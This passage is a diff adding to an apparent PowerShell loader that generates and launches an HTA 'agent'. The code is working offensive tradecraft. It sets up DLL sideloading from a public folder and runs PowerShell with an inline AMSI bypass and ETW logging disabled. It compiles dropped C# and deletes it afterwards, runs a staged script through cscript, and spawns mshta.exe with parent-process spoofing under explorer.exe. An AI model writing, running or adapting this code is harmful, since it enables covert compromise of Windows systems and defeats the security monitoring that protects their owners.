+var sideloadDst = "C:\\Users\\Public\\Libraries\\" + sideloadExe;
+if (sideloadExe) {
+    log("[*] Copying " + sideloadExe);
+    try {
+        fso.CopyFile(sideloadSrc, sideloadDst, true);
+        log("[+] " + sideloadExe + " copy OK");
+    } catch(e) { log("[-] " + sideloadExe + " copy FAILED: " + e.message); }
+}
+
+log("[*] Running " + (sideloadExe || "skipped") + " (DLL sideloading)...");
+if (sideloadExe) {
+    try {
+        var sideloadRc = shell.Run(sideloadDst, 0, true);
+        log("[+] " + sideloadExe + " completed (exit code " + sideloadRc + ")");
+    } catch(e) { log("[-] " + sideloadExe + " FAILED: " + e.message); }
+}
+
+// Stage 3: Squiblydoo via C# Add-Type + arg spoofing (single PS, AMSI bypass inline)
+log("[*] Starting Squiblydoo (AMSI bypass + Add-Type + arg spoofing)...");
+try {
+    var csCode = "$escapedCsSource";
+    var csPath = "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\spoof.cs";
+    var f = fso.CreateTextFile(csPath, true);
+    f.Write(csCode);
+    f.Close();
+    var squiblyRc = shell.Run('powershell -NoP -Exec Bypass -C "[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue(`$null,`$true);[Ref].Assembly.GetType(''System.Management.Automation.Tracing.PSEtwLogProvider'').GetField(''etwProvider'',''NonPublic,Static'').SetValue(`$null,[Guid]::Empty);Add-Type -Path \"' + csPath + '\" -Language CSharp; [Spoof]::Go()"', 0, true);
+    fso.DeleteFile(csPath, true);
+    log("[+] Squiblydoo executed (exit code " + squiblyRc + ")");
+} catch(e) { log("[-] Squiblydoo FAILED: " + e.message); }
+
+// Stage 4: cscript.exe with stage.js (BLOCKING)
+log("[*] Running cscript.exe with stage.js...");
+try {
+    var cscriptRc = shell.Run("cscript //nologo C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\stage.js", 0, true);
+    log("[+] cscript.exe completed (exit code " + cscriptRc + ")");
+} catch(e) { log("[-] cscript.exe FAILED: " + e.message); }
+
+log("[+] agent.hta complete");
+window.close();
+</script>
+</head>
+<body>Loading...</body>
+</html>
+"@
+
+$utf8NoBom = New-Object System.Text.UTF8Encoding($false)
+[System.IO.File]::WriteAllText($htaPath, $htaContent, $utf8NoBom)
+if (Test-Path $htaPath) {
+    Write-Log "[+] agent.hta generated at $htaPath - $($htaContent.Length) chars"
+} else {
+    Write-Log "[-] HTA generation FAILED"
+}
+
+# -- PPID Spoof: spawn mshta.exe with parent = explorer.exe via C# --
+Write-Log "[*] Spawning mshta.exe with PPID spoof (parent = explorer.exe)..."
+try {
+    $explorer = Get-Process -Name explorer -ErrorAction SilentlyContinue | Select-Object -First 1
+    if (-not $explorer) {
+        Write-Log "[-] explorer.exe process not found - spawning without PPID"
+        Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    } else {
+        Add-Type -TypeDefinition $spoofSource -Language CSharp -ErrorAction Stop
+        $spawnPid = [Spoof]::SpawnWithParent("mshta.exe `"$htaPath`"", $explorer.Id)
+        if ($spawnPid -ge 0) {
+            Write-Log "[+] mshta.exe spawned via PPID spoof - PID $spawnPid"
+        } else {
+            Write-Log "[-] PPID spoof failed (fallback: direct spawn)"
+            Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
+        }
+    }
+} catch {
+    Write-Log "[-] mshta.exe spawn FAILED - $_"
+}
+
+Write-Log "[+] loader.ps2 complete"
